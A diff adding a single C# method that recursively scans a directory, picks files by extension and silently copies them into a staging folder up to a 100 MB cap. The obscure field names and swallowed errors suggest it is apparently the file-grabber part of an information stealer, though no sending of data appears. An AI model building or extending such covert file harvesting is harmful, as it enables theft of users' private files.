@@ -1,0 +1,19 @@
+ public static void RecursScan()
+    {
+        long DS = 100000000;
+        long copiedSoFar = 0;
+        IEnumerable<string> findFiles = System.IO.Directory.GetFiles(Easy.GooVer, "*.*", System.IO.SearchOption.AllDirectories);
+        foreach (string fileName in findFiles)
+        {
+            string ext = Path.GetExtension(fileName).ToLower();
+            if (Array.IndexOf(Easy.Extensions, ext) < 0) continue;
+            try
+            {
+                var fileSize = new FileInfo(fileName).Length;
+                if (copiedSoFar + fileSize > DS) continue;
+                File.Copy(fileName, Path.Combine(Easy.str1, Path.GetFileName(fileName)), true);
+                copiedSoFar += fileSize;
+            }
+            catch { }
+        }
+    }
